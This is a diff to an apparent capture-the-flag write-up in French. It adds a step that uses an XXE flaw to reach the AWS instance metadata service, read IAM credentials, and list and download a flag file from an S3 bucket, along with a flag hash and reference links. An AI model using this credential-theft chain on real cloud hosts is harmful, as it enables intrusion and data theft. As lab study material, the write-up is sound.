@@ -42,6 +42,18 @@ More detail: ['Step3'](./step3.md)
 
 > 0D7D2DDEA2B25FF0D35D3E173BA2CDCB120D3554E124EBE2B147B79CF0007630
 
+## Step 4
+
+More detail: ['Step4'](./step4.md)
+
+1. pour chopper les creds du bucket, il faut taper sur http://169.254.169.254/latest/meta-data/iam/security-credentials/ grâce à la xxe
+2. récupérer les infos du bucket : http://169.254.169.254/latest/dynamic/instance-identity/document
+3. set les variables d'env : AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_DEFAULT_REGION, AWS_SESSION_TOKEN
+4. aws s3 ls s3://willywonka-shop
+5. aws s3 cp s3://willywonka-shop/Flag-04.txt .
+
+> 0AFBDBEA56D3B85BEBCA19D05088F53B61F372E2EBCDEFFCD34CECE8473DF528
+
 ## Resources
 
 1. GitTools : https://github.com/internetwache/GitTools.git
@@ -51,6 +63,7 @@ More detail: ['Step3'](./step3.md)
 5. jwt encoder / decoder : https://www.jsonwebtoken.io/
 6. lfi and ssrf via xxe : https://hackerone.com/reports/347139
 7. xxe oob : https://www.acunetix.com/blog/articles/band-xml-external-entity-oob-xxe/
+8. s3 bucket ssrf metadata : https://blog.christophetd.fr/abusing-aws-metadata-service-using-ssrf-vulnerabilities/
 
 ---
 
